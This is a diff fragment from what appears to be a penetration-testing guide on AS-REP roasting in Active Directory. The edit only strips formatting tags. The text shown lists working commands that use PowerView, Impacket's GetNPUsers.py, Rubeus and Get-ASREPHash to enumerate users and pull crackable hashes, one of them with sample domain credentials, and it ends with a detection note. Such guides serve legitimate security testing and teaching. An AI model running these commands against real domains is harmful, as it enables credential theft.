@@ -43,21 +43,21 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 
 ### Request AS\_REP message
 
-{% code title="Using Linux" %}
+
 ```bash
 #Try all the usernames in usernames.txt
 python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 #Use domain creds to extract targets and target them
 python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
 ```
-{% endcode %}
 
-{% code title="Using Windows" %}
+
+
 ```bash
 .\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
-{% endcode %}
+
 
 
 AS-REP Roasting with Rubeus will generate a 4768 with an encryption type of 0x17 and preauth type of 0.
